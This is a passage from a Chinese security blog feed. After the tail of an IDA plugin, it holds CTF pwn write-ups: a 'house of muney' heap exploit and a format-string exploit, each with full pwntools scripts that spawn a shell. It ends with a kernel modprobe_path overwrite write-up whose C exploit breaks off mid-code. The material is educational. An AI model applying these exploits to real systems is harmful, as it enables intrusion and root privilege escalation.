class="built_in">print</span>(<span class="string">&quot;Transfer data failed or invalid address&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_thread</span>(<span class="params">self, server_socket</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            address = socket_get_address(server_socket)</span><br><span class="line">            <span class="keyword">if</span> address != <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;jump to address 0x<span class="subst">&#123;address:X&#125;</span>&quot;</span>)</span><br><span class="line">                ida_kernwin.execute_sync(<span class="keyword">lambda</span>: execute_and_jump_to_address(address), ida_kernwin.MFF_WRITE)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">term</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SynGDB plugin terminated&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在 <code>IDA</code> 中加载插件的方法：</p>
<ol>
<li>先将上面的代码保存成一个名为 <code>SynGDB.py</code> 的文件并放到 <code>IDA</code> 的 <code>plugins</code> 目录下</li>
<li>打开 <code>IDA</code> 选择 <code>Edit-&gt;Plugins-&gt;SynGDB</code> 即可启动插件（如下图），启动插件的快捷键为 <code>Alt+F5</code></li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201814739.png" alt="image-20230920181441570"></p>
]]></content>
      <categories>
        <category>尝试开发小工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>小工具</tag>
        <tag>IDA插件</tag>
        <tag>GDB命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Ciscn2023-华中赛区分区赛-pwn-wp</title>
    <url>/posts/e4508dbd.html</url>
    <content><![CDATA[<p>今年国赛的华中分区赛一共放了两道 <code>PWN</code> ，一个一解，一个零解。零解的是 <code>LLVM PASS PWN</code> ，这个没有研究过，暂且先复现另一个题目（考察的是 <code>house of muney</code>）还有一个 <code>AWD</code> 环节的 <code>PWN</code> （考察的格式化字符串漏洞）</p>
<span id="more"></span>

<h3 id="muney"><a href="#muney" class="headerlink" title="muney"></a>muney</h3><p>本题没给 <code>libc</code> ，听说远程的 <code>libc</code> 版本为 <code>2.31 9.9</code> ，我这里用的是这个</p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301539057.png" alt="image-20230630153903673"></p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>主函数首先是输入数据，并且将其传入了 <code>sub_4021f3</code> 函数进行处理，不断循环这个过程</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301542350.png" alt="image-20230630154203298"></p>
<p><code>sub_4021f3</code> 函数是对各种功能的封装，不过在此之前经过了 <code>jiexi</code>（重命名后）函数对数据的解析处理，这里也是主要来逆向的地方。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301543451.png" alt="image-20230630154341391" style="zoom:67%;" />



<p><code>jiexi</code> 函数的这个解析规则，可以通过 <code>GDB</code> 动态调试加上 <code>IDA</code> 静态分析来判断出这个函数就是在解析 <code>HTTP</code> 请求头，也就是输入的数据以 <code>HTTP</code> 请求头的格式输入即可。再简单调试一下，观察下哪部分是触发功能的选项以及参数即可，最终得出了规则大概如下（以触发 <code>create</code> 函数为例）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<p><code>create</code> 函数可以申请堆块，而堆块最小为 <code>0x100000</code> ，这就意味着堆块会直接由 <code>mmap</code> 映射出来，位于内存映射区。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301555216.png" alt="image-20230630155510162" style="zoom:50%;" />



<h4 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h4><p>在 <code>edit</code> 函数中，首先是获取了两个参数，第一个是索引，第二个则是偏移 <code>offset</code>，在下图的红框部分中可以发现针对偏移 <code>offset</code> 的检查并没有做好，只检查了偏移不能大于申请内存块时的 <code>size</code> ，但是却可以为负（<code>v9</code> 为 <code>int64</code> 类型），这就导致了可以在申请内存块的上方（低地址方向）去写入数据</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301600658.png" alt="image-20230630160058576" style="zoom:50%;" />



<p>同时还存在一个 <code>exit</code> 函数，其参数为 <code>/bin/sh</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301631953.png" alt="image-20230630163136902"></p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>我在比赛时考虑的思路是想把 <code>exit</code> 函数的 <code>got</code> 表改为 <code>system</code> ，最后触发即可。但一直苦于没有 <code>libc</code> 地址。当时是向 <code>mmap</code> 映射出来的区域的低地址处写入数据（劫持了 <code>__free_hook</code> ），再用 <code>delete</code> 函数进行触发，也确实是可以任意地址执行，但没有泄露 <code>libc</code> 地址的机会，也就卡死在这里了。</p>
<p>比赛结束后，请教了一下华科的师傅，才知道有 <code>house of muney</code> 这种手法。</p>
<p>原理是这样的：在进行延迟绑定时，解析出符号的真实地址是用 <code>libc</code> 基地址加上符号表中 <code>st_value</code> 字段值获得的，如果能修改 <code>st_value</code> 这个值的话，将其改为 <code>system</code> 函数的 <code>st_value</code>，最终就可以让 <code>exit</code> 被解析成 <code>system</code>。困难在于每个符号的 <code>sym</code> 结构体所在内存区域是只读的，因此要改大内存块的 <code>size</code>，将其释放掉再申请出来，而 <code>malloc</code> 触发的 <code>mmap</code> 出的内存都是<strong>可读写</strong>的，只要足够大，就可以将符号的 <code>sym</code> 结构体给申请出来进行篡改。</p>
<p>不过为了绕过一些检查，最终能成功进行解析函数真实地址，还需要篡改一些字段。分别是 <code>bitmask_word</code> <code>bucket</code> <code>hasharr</code> <code>st_value</code> </p>
<p>至此，整体的流程如下</p>
<ol>
<li>申请一个 <code>0x150000</code> 的内存块</li>
<li>利用 <code>edit</code> 功能，修改内存 <code>size</code> 为 <code>0x171002</code> (不能太大，但是太小了又覆盖不到)</li>
<li>将其释放掉</li>
<li>申请一个 <code>0x171002</code> 的内存块，之后就可以来在这个范围内地址进行任意写入</li>
<li>伪造上面提到字段的值</li>
<li>最后触发 <code>exit(&quot;/bin/sh&quot;)</code> ，就能够解析成 <code>system(&quot;/bin/sh&quot;)</code></li>
</ol>
<p>需要伪造这几个字段的值写在了 <code>EXP</code> 中，<code>st_name</code> 的后四个字节是 <code>strtab</code> 距离符号名（<code>exit</code>）的偏移量 （不同程序需要调试得到），<strong>该字段前四个字节是固定的，<code>bitmask_word</code> 和 <code>bucket</code> 以及 <code>hasharr</code> 也都是固定的。</strong></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;muney1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Offset: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(offset).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length).encode()+<span class="string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /delete HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /quit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x150000</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,-<span class="number">8</span>,<span class="number">3</span>,<span class="string">b&#x27;\x02\x10\x17&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,delete(<span class="number">0</span>))</span><br><span class="line">debug(p,<span class="number">0x401FFF</span>,<span class="number">0x4021EE</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x171002</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit@st_value distance mmap_base 0xf00012001a67e5    fake_data   0x1a67e5</span></span><br><span class="line"><span class="comment">#bitmask_word distance mmap_base 0x152b88  fake_data 0xf010028c0201130e</span></span><br><span class="line"><span class="comment">#bucket distance mmap_base 0x152cb0    fake_data 0x86</span></span><br><span class="line"><span class="comment">#hasharr distance mmap_base 0x153d7c   fake_data 0x7c967e3e7c967e3f</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152b78</span>,<span class="number">8</span>,p64(<span class="number">0xf010028c0201130e</span>)))<span class="comment">#write data to bitmask_word</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152ca0</span>,<span class="number">1</span>,p8(<span class="number">0x86</span>)))<span class="comment">#write data to bucket</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x153d6c</span>,<span class="number">8</span>,p64(<span class="number">0x7c967e3e7c967e3f</span>)))<span class="comment">#write data to hasharr</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x8</span>,<span class="number">3</span>,<span class="string">b&quot;\x90\x22\x05&quot;</span>))<span class="comment">#write data to exit@st_value</span></span><br><span class="line"><span class="comment">#0x1a67e5</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>,<span class="number">3</span>,<span class="string">b&quot;\xe5\x67\x1a&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">4</span>,<span class="number">1</span>,<span class="string">b&quot;\x12&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">6</span>,<span class="number">1</span>,<span class="string">b&quot;\xf0&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line"><span class="comment">#因为没办法写入 \x00 的原因，这里的st_name分了多次写入</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,quit())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301840455.png" alt="image-20230630184048404"></p>
<h3 id="awd-pwn"><a href="#awd-pwn" class="headerlink" title="awd_pwn"></a>awd_pwn</h3><p>程序实现了一个 <code>shell</code> ，漏洞位于 <code>echo</code> 中，如果 <code>echo</code> 后面有至少两个参数并且没有 <code>&gt;</code> 的情况下，除去最后一个参数，剩下参数打印时会触发格式化字符串漏洞（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302215516.png" alt="image-20230630221533284"></p>
<p>利用思路是打栈链（考察的是非栈上的格式化字符串漏洞），劫持原本返回地址 <code>libc_start_main</code> 为 <code>one_gadget</code> ，最终输入一个非法命令，退出即可拿到 <code>shell</code></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;$ \x1B[0m&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">cmd(<span class="string">&quot;echo %29$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x240b3</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b31</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1Ed5</span>,<span class="number">0x2818</span>,<span class="number">0x23C5</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %12$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">libc_start_main_address=stack_addr+<span class="number">0x38</span></span><br><span class="line"> </span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line"><span class="comment">#write 0xe8 to address of libc_start_main </span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(libc_start_main_address&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line"><span class="comment">#one_gadget 0xe3b31</span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((libc_start_main_address+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302229508.png" alt="image-20230630222938439"></p>
<h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><p><strong>muney</strong></p>
<p>链接：<a href="https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5">https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5</a><br>提取码：flc5</p>
<p><strong>awd_pwn</strong></p>
<p>链接：<a href="https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234">https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234</a> </p>
<p>提取码：1234</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://roderickchan.github.io/zh-cn/2022-06-18-glibcheap-house-of-muney/#poc">GlibcHeap-house of muney - roderick - record and learn! (roderickchan.github.io)</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-272416.htm#msg_header_h3_56">原创]how2heap深入浅出学习堆利用-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>house of muney</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 kernel-RW Any Memory 的学习总结</title>
    <url>/posts/12effc43.html</url>
    <content><![CDATA[<p>通过 <code>2019STARCTF hackeme</code> 这道题目的学习，了解到了在内核中内存具有任意地址读写的能力后，可以利用的手法。</p>
<span id="more"></span>

<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>modprobe</code> 是一个 <code>Linux</code> 程序，用于在 <code>Linux</code> 内核中添加或移除一个可加载内核模块，该程序的路径是内核全局变量，默认为 <code>/sbin/modprobe</code>，存在在内核符号 <code>modprobe_path</code> 下（此处内存有可写权限）。</p>
<p>当执行的文件类型为系统未知的类型时（也就是未知的文件魔术头），将通过 <code>modprobe_path</code> 来执行 <code>modprobe</code> 程序。需要注意的是，<code>modprobe_path</code> 中存储的路径并不会被判断是否正常，无论路径指向的是哪个文件，都会将其执行，因为系统仍然处于内核模式，所以是以 <code>root</code> 权限执行的目标文件，如果目标文件是我们编写的 <code>shell</code> 脚本，那么就相当于我们具有了 <code>root</code> 权限下的任意执行命令的能力。</p>
<p>因此如果有任意地址读写的能力，可以考虑覆盖 <code>modprobe_path</code> ，它比起调用<code>commit_creds(prepare_kernel_cred(0))</code> 更方便。</p>
<p>题目是 2019STARCTF hackeme 链接：<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme">https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme</a></p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>通过下面的 <code>_kmalloc</code> 函数，可以分析出来 <code>v19</code> 是 <code>size</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png" alt="image-20230410201237881"></p>
<p>而程序最开始有一个 <code>copy_from_user</code> 函数， <code>copy</code> 了 <code>32</code> 个字节的数据，正好是可以控制从 <code>v17</code> 开始到 <code>v20</code> ，考虑到上面 <code>v19</code> 是个 <code>size</code> ，我们可以猜测这四个变量都是一个结构体中的成员变量</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png" alt="image-20230410201412269"></p>
<p>通过这三行代码，可以猜测出来 <code>v17</code> 是一个 <code>index</code> ，其决定了申请出来堆块的地址放到 <code>pool</code> 数组的哪个位置（ <code>pool</code> 数组就是来存放申请的堆块地址的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png" alt="image-20230410203337467"></p>
<p>这里将 <code>v18</code> 中的数据 <code>copy</code> 到了刚刚申请的堆块中，所以我们判断 <code>v18</code> 是 <code>data_ptr</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png" alt="image-20230410211733810"></p>
<p>程序中的 <code>v20</code> ，刚开始看感觉很奇怪，具体啥作用也说不上来，因为 <code>v4</code> 已经是堆地址了，所以加上的 <code>v20</code> 我们姑且称之为 <code>offset</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png" alt="image-20230410212250229"></p>
<p>四个变量名字确定之后，开始分析程序</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png" alt="image-20230410215435020"></p>
<p>首先是 <code>delete</code> 部分（如上），发现这个 <code>kfree()</code> 很奇怪，因为 <code>IDA</code> 生成的伪代码看不到参数，溯源一下汇编发现 <code>kfree</code> 的参数其实就是 <code>v14</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png" alt="image-20230410215111627"></p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>这个 <code>add</code> 部分可以发现 <code>v12[0]</code> 存放的是申请的 <code>chunk_addr</code> ，<code>v12[1]</code> 存放的是 <code>size</code> ，而 <code>v12</code> 本身就是 <code>pool[2*index]</code> 数组的地址，因此 <code>chunk_addr</code> 和 <code>size</code> 都记录在了 <code>pool</code> 数组中。通过 <code>copy_from_user</code> 函数向堆块中写入数据。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png" alt="image-20230410215619344"></p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png" alt="image-20230410222056453"></p>
<p>如上图所示， <code>v5[1]</code> 是 <code>idx</code> 对应堆块的 <code>size</code> ，这里的 <code>offset+size</code> 只判断了是否小于 <code>v5[1]</code> ，但是忘记判断了 <code>offset+size</code> 要大于 <code>0</code>，所以这里的 <code>offset</code> 可以为负值，如果 <code>offset</code> 为负数的话，就导致了 <code>offset+chunk_addr</code> 拷贝的并不是当前指定的堆块中数据，可能是上一个堆块（低地址处）的数据，在这个 <code>show</code> 部分相当于任意地址读</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png" alt="image-20230410222823697"></p>
<p>和上面 <code>show</code> 部分的漏洞一样， <code>offset</code> 值可以为负，从而可以任意地址写。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>slub</code> 分配器是 <code>Linux</code> 内核中的一种内存分配器,其分配原理和 <code>fastbin</code> 原理类似，不过这里分配的堆块没有堆块头，也就是不加 <code>0x10</code> ，申请多少就是多少。</p>
<p>利用思路就是类似于 <code>fastbin attack</code> 的手法，数组索引向上（低地址）溢出，覆盖 <code>fd</code> 指针，从而实现任意地址申请和泄露。首先去泄露出内核基地址，然后加上 <code>mod_tree</code> 在内核中的偏移（ <code>mod_tree</code> 在内核中，而里面有模块的指针，所以通常我们用它来泄露出模块的基地址）得到 <code>mod_tree</code> 地址，将其申请出来，泄露出模块的基地址。有了模块的地址，我们就可以将 <code>pool</code> 数组申请出来写入 <code>modprobe_path</code> 指针（该指针在内核中），用 <code>edit</code> 功能实现任意地址写（我猜测无法直接将 <code>fd</code> 指针控制为 <code>modprobe_path</code> 申请出来然后写入数据的原因是这样会破坏原本内核中的堆结构，如果利用 <code>pool</code> 数组任意写的话，可以将之前的堆结构再恢复）</p>
<p>上面的过程和做 <code>glibc</code> 堆题的思想基本一致，具体过程就不再赘述。</p>
<p>但我一直不明白为什么我的脚本会导致内核崩溃，就是执行完篡改 <code>modprobe_path</code> 都没有崩溃，可以看到下图是改写成功的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png" alt="image-20230417202505374"></p>
<p>此时也没有崩溃，但是再返回到用户态调用函数或者再运行一次脚本，内核就会崩溃重启。</p>
<p>可能是我破坏了某些堆结构？可是我将之前全部破坏的指针又用任意地址写恢复了，emmm 因为是完全自己写的，所以可能是某个奇奇怪怪的地方搞坏了，不过最终思想是没问题的，因为确实是成功改掉了路径。</p>
<p>下面放一下我这个会崩溃的 <code>EXP</code> … 也算记录一下</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> *user_ptr;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 